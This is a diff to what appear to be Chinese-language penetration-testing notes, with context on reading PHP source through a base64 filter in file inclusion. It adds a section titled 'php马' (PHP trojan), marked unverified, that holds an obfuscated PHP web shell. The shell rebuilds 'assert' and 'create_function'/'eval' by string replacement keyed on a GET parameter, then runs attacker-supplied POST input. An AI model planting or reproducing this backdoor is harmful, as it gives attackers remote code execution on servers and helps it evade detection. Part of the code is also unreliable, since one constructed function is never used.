@@ -213,6 +213,18 @@ apt install seclists
 正常读取php文件会将php执行后返回，而无法获取它的源码，而采用base64编码后，就不会执行php代码，而直接返回base64的编码。resource后的文件可以是目标服务器上的任何已知确定存在的文件。
 
 
+#### php马
+
+(未经验证)  
+```php
+<?php
+	$bb = str_replace($_GET['key'], '', 'create_function');
+	$aa = $bb('$a', 'ev'.'al($a);');
+	$t = str_replace($_GET['key'], '', 'assxxxert');
+	$t($_POST['pass']);
+?>
+```
+
 
 # 杂
 
